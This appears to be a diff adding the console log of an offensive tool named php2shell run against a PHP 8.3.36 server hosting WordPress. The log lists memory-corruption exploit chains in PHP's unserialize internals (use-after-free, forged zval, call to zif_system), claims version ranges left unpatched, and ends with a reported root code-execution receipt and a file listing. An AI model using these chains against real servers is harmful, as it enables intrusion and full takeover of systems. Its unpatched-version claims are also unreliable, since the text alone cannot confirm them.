@@ -1,0 +1,31 @@
+php2shell 1.0.0 — recon
+============================================================
+[*] PHP 8.3.36 (docker:/usr/local/bin/php)
+[*] Server API => Command Line Interface
+[*] session.serialize_handler => php => php
+[*] session.upload_progress.enabled => On => On
+[+] zif_system = +0x48d4c0 (rela-scan(canary 1/3))
+[*] binary base 0x555555400000  ZendMM chunks: 0x7ffff6200000
+============================================================
+CHAINS (post-recon viability for this target):
+  [sessgap  ] N/A      (not a binary target)
+  [zero4    ] VIABLE  var_destroy re-entry UAF -> reclaim -> forged zval -> zif_system
+        -> PHP 8.3.36 in the receipted range 8.1 - 8.5.12 (var layer unpatched through 8.5.12; receipts: vanilla-docker 8.5.11/8.3.36, jammy 8.1.2-1ubuntu2.27, php.net 8.5.12)
+  [zero5    ] VIABLE  serialize-side mirror UAF -> groom self-reclaim -> dtor_obj=zif_system
+        -> PHP 8.3.36 — receipted on the 8.5.x line (8.5.11/8.5.12); fixed upstream only after 8.5.12; 8.1-8.3 share the var.c code but the reclaim is receipted on 8.5 — use zero4 there)
+  [uprog    ] N/A      (not a binary target)
+  [cformat  ] N/A      (not a binary target)
+  [nativephp] N/A      (not a binary target)
+  [win-sess ] N/A      (not a binary target)
+============================================================
+
+=== FIRE: [zero4] var_destroy re-entry UAF -> reclaim -> forged zval -> zif_system ===
+[*] zero4: PHP 8.3.36 base 0x555555400000 zif_system 0x55555588d4c0
+[*] staged /tmp/w/vdR4_call.php; exploit-as-oracle sweep (window 0x90000-0xd0000, then full chunk)
+[+] === zero4: FULL RCE === freed-block base 0x7ffff6291000 (1s sweep)
+[+] RECEIPT: uid=0(root) gid=0(root) groups=0(root)
+index.php
+license.txt
+readme.html
+wp-activate.php
+wp-admin
